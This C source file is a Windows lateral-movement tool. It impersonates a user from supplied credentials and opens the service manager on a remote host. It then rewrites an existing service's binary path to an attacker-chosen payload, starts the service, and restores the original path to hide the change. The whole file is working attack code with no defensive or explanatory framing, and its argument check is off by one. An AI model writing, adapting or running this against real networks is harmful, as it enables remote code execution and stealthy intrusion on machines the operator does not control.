#include <Windows.h>
#include <stdio.h>

int main(int argc, char **argv){

    if(argc < 6){

        printf("Missing agrs\n");
        ExitProcess(0);
    }

    CHAR *username = argv[1];
    CHAR *password = argv[2];
    CHAR *domain = argv[3];
    CHAR *target = argv[4];
    CHAR *service = argv[5];
    CHAR *payload = argv[6];
    CHAR *originallpBinaryPathName = NULL;

    HANDLE hToken = NULL;
    SC_HANDLE scHandle = NULL;
    SC_HANDLE  scService = NULL;
    LPQUERY_SERVICE_CONFIGA lpqsca = NULL;
    DWORD dwSize = NULL;
    DWORD dwSizeSecond = NULL;

    BOOL bResult = FALSE;

    bResult = LogonUserA(username,domain,password,LOGON32_LOGON_NEW_CREDENTIALS,LOGON32_PROVIDER_DEFAULT,&hToken);

    if(!bResult){
        printf("LogonUserA Failed. Error %d\n",GetLastError());
        ExitProcess(0);
    }

    printf("LogonUserA succeed 0x%p\n",hToken);

    bResult = ImpersonateLoggedOnUser(hToken);

    if(!bResult){
        printf("ImpersonateLoggedOnUser Failed. Error %d\n",GetLastError());
        ExitProcess(0);
    }

    printf("ImpersonateLoggedOnUser succeed 0x%p\n",hToken);


    scHandle = OpenSCManagerA(target,SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

    if(scHandle == NULL){

        printf("OpenSCManagerA Failed. Error %d\n",GetLastError());
        ExitProcess(0);
    }

    scService = OpenServiceA(scHandle,service,SERVICE_ALL_ACCESS);

     if(scService == NULL){

        printf("scService Failed. Error %d\n",GetLastError());
        ExitProcess(0);
    }

    printf("OpenServiceA succeed 0x%p\n",scService);

    QueryServiceConfigA(scService,NULL,0,&dwSize);

    printf("LPQUERY_SERVICE_CONFIGA size is: %d\n",dwSize);

    lpqsca = GlobalAlloc(GPTR,dwSize);

    bResult = QueryServiceConfigA(scService,lpqsca,dwSize,&dwSizeSecond);

    if(bResult == NULL){

        printf("QueryServiceConfigA Failed. Error %d\n",GetLastError());
        ExitProcess(0);
    }

    printf("%s\n",lpqsca->lpBinaryPathName);

    originallpBinaryPathName = lpqsca->lpBinaryPathName;

    ChangeServiceConfigA(scService,SERVICE_NO_CHANGE,SERVICE_DEMAND_START,SERVICE_ERROR_IGNORE,payload,NULL,NULL,NULL,NULL,NULL,NULL);

    StartServiceA(scService,0,NULL);

     DWORD dwResult = GetLastError();
     printf("%d\n",dwResult);

     ChangeServiceConfigA(scService,SERVICE_NO_CHANGE,SERVICE_DEMAND_START,SERVICE_ERROR_IGNORE,originallpBinaryPathName,NULL,NULL,NULL,NULL,NULL,NULL);

    GlobalFree(lpqsca);

    CloseHandle(hToken);
    CloseServiceHandle(scHandle);


    return 0;
}
